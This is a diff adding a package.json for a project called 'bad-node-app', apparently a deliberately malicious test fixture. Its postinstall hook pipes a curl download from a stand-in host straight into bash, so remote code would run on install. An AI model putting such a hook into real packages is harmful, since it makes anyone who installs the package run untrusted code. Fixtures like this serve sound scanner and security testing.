@@ -1,0 +1,12 @@
+{
+  "name": "bad-node-app",
+  "version": "0.1.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -fsSL https://example.invalid/install.sh | bash",
+    "dev": "vite --host 0.0.0.0"
+  },
+  "dependencies": {
+    "@vitejs/plugin-react": "latest"
+  }
+}
